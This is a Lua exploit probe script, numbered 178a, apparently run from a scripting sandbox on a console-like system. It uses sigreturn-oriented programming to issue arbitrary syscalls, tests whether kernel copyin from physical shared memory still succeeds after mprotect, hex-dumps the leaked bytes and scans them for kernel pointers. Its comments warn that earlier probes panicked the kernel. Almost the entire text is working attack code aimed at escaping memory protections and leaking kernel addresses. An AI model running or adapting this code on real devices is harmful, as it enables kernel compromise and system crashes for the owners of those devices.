-- CRASH_CLASS: MODERATE
-- PROBE 178a: Minimal physhm copyin-after-mprotect test
--
-- 177a crashed at startup (42 bytes only). This minimal version:
-- 1. physhm_open(1,2,0,0) -> fd
-- 2. pipe() -> rd,wr
-- 3. mmap(physhm fd) -> va
-- 4. write(wr, va, 8) BEFORE mprotect (baseline, expect -1)
-- 5. mprotect(va, PROT_READ) (expect 0, confirmed twice)
-- 6. write(wr, va, 8) AFTER mprotect (THE KEY TEST)
-- 7. If copyin worked, read from pipe and dump
--
-- WARNING: 175a/176a caused kernel panic. This probe may too.

print("=== 178a: PHYSHM COPYIN MINIMAL ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sca = uint64(string.format("0x%X%08X", rh, rl - 2))
print("srop_ok")

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sca)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer for reading pipe data
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- 1. physhm_open
local rv = srop(629, uint64(1), uint64(2), uint64(0), uint64(0))
local fd = rv and to_num(rv) or -1
print("physhm_fd=" .. fd)
if fd < 0 then print("DEAD") return end

-- 2. pipe
rv = srop(42)
local prd = rv and to_num(rv) or -1
print("pipe=" .. prd)
if prd < 0 then print("DEAD") return end

-- 3. mmap physhm
rv = srop(477, uint64(0), uint64(0x4000), uint64(3),
    uint64(1), uint64(fd), uint64(0))
local mh, ml = 0, 0
if rv then mh, ml = get_hi_lo(rv) end
print("va=" .. hex64(rv))
if mh == 0 and ml == 0 then print("NULL") return end
local va = uint64(string.format("0x%X%08X", mh, ml))

-- 4. write BEFORE mprotect
rv = srop(4, uint64(prd + 1), va, uint64(8))
local wb = rv and to_num(rv) or -999
print("write_BEFORE=" .. wb)
if wb > 0 then srop(3, uint64(prd), ga(0), uint64(wb)) end

-- 5. mprotect(PROT_READ)
rv = srop(74, va, uint64(0x4000), uint64(1))
local mp = rv and to_num(rv) or -999
print("mprotect=" .. mp)

-- 6. write AFTER mprotect
rv = srop(4, uint64(prd + 1), va, uint64(64))
local wa = rv and to_num(rv) or -999
print("write_AFTER=" .. wa)

if wa > 0 then
    print("!!! COPYIN AFTER MPROTECT = " .. wa .. " BYTES !!!")
    -- Read from pipe
    for i = 0, 0xFF, 4 do wd(gpu + i, 0) end
    rv = srop(3, uint64(prd), ga(0), uint64(wa))
    local got = rv and to_num(rv) or -1
    print("recv=" .. got)
    if got > 0 then
        -- Hex dump
        for row = 0, math.min(3, math.floor((got-1)/16)) do
            local line = string.format("+%02X:", row * 16)
            for i = 0, 15 do
                local off = row * 16 + i
                if off < got then
                    local dw = rd(gpu + (off - off%4))
                    local b = math.floor(dw / (256 ^ (off%4))) % 256
                    line = line .. string.format(" %02X", b)
                end
            end
            print(line)
        end
        -- Scan for kernel pointers
        for off = 0, got - 8, 8 do
            local qv = rq(gpu + off)
            local qh = get_hi_lo(qv)
            if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                print("KPTR +" .. string.format("%02X", off) .. "=" .. hex64(qv))
            end
        end
    end
else
    print("copyin_still_fails")
    -- Try writev as alternative
    wq(gpu + 0x1000, va)
    wq(gpu + 0x1008, uint64(64))
    rv = srop(121, uint64(prd + 1), ga(0x1000), uint64(1))
    local wv = rv and to_num(rv) or -999
    print("writev=" .. wv)
end

-- Cleanup
srop(6, uint64(prd))
srop(6, uint64(prd + 1))
srop(73, va, uint64(0x4000))
srop(6, uint64(fd))
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
